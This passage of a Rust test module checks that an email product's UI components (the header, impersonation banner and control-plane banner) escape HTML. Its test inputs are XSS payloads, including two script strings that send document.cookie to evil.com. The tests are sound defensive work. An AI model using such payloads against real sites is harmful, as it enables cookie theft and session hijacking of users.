        assert!(web.contains("data-sidebar-storage-key=\"apexmail-ui\""));
        assert!(web.contains("data-theme-storage-key=\"apexmail-ui:theme\""));
        assert!(web.contains("data-keyboard-shortcuts"));
        assert!(web.contains("data-shortcut-action=\"toggle-theme\""));
        assert!(web.contains("role=\"navigation\" aria-label=\"Mobile navigation\""));
        assert!(web.contains("w-20"));
        assert!(web.contains("Dashboard"));
        assert!(web.contains("Could not end impersonation session."));
        assert!(web.contains("Saved"));
        assert!(control.contains("data-user-role=\"admin\""));
        assert!(control.contains("data-theme-storage-key=\"apexmail-ui:theme\""));
        assert!(control.contains("data-keyboard-shortcuts"));
        assert!(control.contains("Safe mode active"));
        assert!(control.contains("aria-label=\"Close navigation menu\""));
        assert!(control.contains("aria-controls=\"control-plane-mobile-sidebar\""));
        assert!(control.contains("Operations"));
        assert!(control.contains("Monitor the fleet."));
        assert!(control.contains("-translate-x-full"));
        assert!(control.contains("href=\"/dashboard\""));
        assert!(control.contains("href=\"/settings/security\""));
        assert!(!control.contains("href=\"/cp/tenants\""));
        assert!(marketing.contains("data-marketing-shell=\"header\""));
        assert!(marketing.contains("data-marketing-shell=\"footer\""));
        assert!(marketing.contains("data-marketing-shell=\"cookie-consent\""));
        assert!(marketing.contains("data-marketing-shell=\"back-to-top\""));
    }

    // ── XSS Prevention Tests ───────────────────────────────────

    #[test]
    fn header_search_query_escapes_xss() {
        // The minimal header (reference design) no longer renders the search
        // query in an <input value="..."> — search is a button affordance, so
        // the query value is never emitted and cannot be an XSS vector. Verify
        // the payload does not appear anywhere in the header output.
        let xss_payload = "<img src=x onerror=\"alert('xss')\">";
        let header = ShellHeader {
            search_query: xss_payload,
            unread_count: 0,
            avatar_fallback: "AM",
            mobile_menu_open: false,
        }
        .render_html();
        assert!(
            !header.contains(xss_payload),
            "raw XSS payload found in header output"
        );
    }

    #[test]
    fn header_avatar_escapes_xss() {
        let xss_payload = "\"><script>alert(1)</script>";
        let header = ShellHeader {
            search_query: "safe",
            unread_count: 0,
            avatar_fallback: xss_payload,
            mobile_menu_open: false,
        }
        .render_html();
        assert!(
            !header.contains("<script>"),
            "unescaped script tag in avatar output"
        );
        assert!(
            header.contains("&lt;script&gt;"),
            "escaped script tag not found"
        );
    }

    #[test]
    fn impersonation_banner_escapes_tenant_id() {
        let xss_payload =
            "<script>document.location='https://evil.com?c='+document.cookie</script>";
        let banner = ImpersonationBanner {
            tenant_id: xss_payload,
            operator_name: "Safe Operator",
            time_remaining: "5:00",
            end_session_error: None,
            ending_session: false,
        }
        .render_html();
        assert!(
            !banner.contains("<script>"),
            "unescaped script in tenant_id"
        );
        assert!(
            banner.contains("&lt;script&gt;"),
            "escaped tenant_id not found"
        );
    }

    #[test]
    fn impersonation_banner_escapes_operator_name() {
        let xss_payload = "Admin<img/src=x onerror=alert(1)>";
        let banner = ImpersonationBanner {
            tenant_id: "safe_tenant",
            operator_name: xss_payload,
            time_remaining: "5:00",
            end_session_error: None,
            ending_session: false,
        }
        .render_html();
        assert!(
            !banner.contains("onerror=alert(1)>"),
            "unescaped img tag in operator_name"
        );
    }

    #[test]
    fn impersonation_banner_escapes_error_message() {
        let xss_payload = "<div onmouseover=\"alert('xss')\">Error</div>";
        let banner = ImpersonationBanner {
            tenant_id: "safe_tenant",
            operator_name: "Admin",
            time_remaining: "5:00",
            end_session_error: Some(xss_payload),
            ending_session: false,
        }
        .render_html();
        // The angle brackets of the <div> tag must be escaped
        assert!(
            !banner.contains("<div onmouseover"),
            "unescaped <div> tag in error message"
        );
        assert!(
            banner.contains("&lt;div onmouseover="),
            "escaped error message not found"
        );
    }

    #[test]
    fn impersonation_banner_escapes_time_remaining() {
        let xss_payload = "\"><script>alert(1)</script><span x=\"";
        let banner = ImpersonationBanner {
            tenant_id: "safe_tenant",
            operator_name: "Admin",
            time_remaining: xss_payload,
            end_session_error: None,
            ending_session: false,
        }
        .render_html();
        assert!(
            !banner.contains("<script>alert(1)</script>"),
            "unescaped script in time_remaining"
        );
    }

    #[test]
    fn control_plane_banner_escapes_message() {
        let xss_payload =
            "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>";
        let control = ControlPlaneShell {
            mobile_menu_open: false,
            user_role: "admin",
            page_title: "Operations",
            page_description: "Monitor the fleet.",
            banners: vec![OperationalBanner {
                tone: "critical",
                message: xss_payload,
            }],
            child_html: "<section>Ops</section>",
            current_path: "/dashboard",
        }
        .render_html();
        assert!(
            !control.contains("<script>fetch"),
            "unescaped script in control plane banner"
        );
        assert!(
            control.contains("&lt;script&gt;"),
            "escaped banner message not found"
        );
    }

    #[test]
    fn html_escape_covers_all_dangerous_chars() {
        assert_eq!(html_escape("<"), "&lt;");
        assert_eq!(html_escape(">"), "&gt;");
        assert_eq!(html_escape("&"), "&amp;");
        assert_eq!(html_escape("\""), "&quot;");
        assert_eq!(html_escape("'"), "&#x27;");
        assert_eq!(html_escape("safe text 123"), "safe text 123");
        assert_eq!(
            html_escape("<script>alert('xss')</script>"),
            "&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;"
        );
    }
}
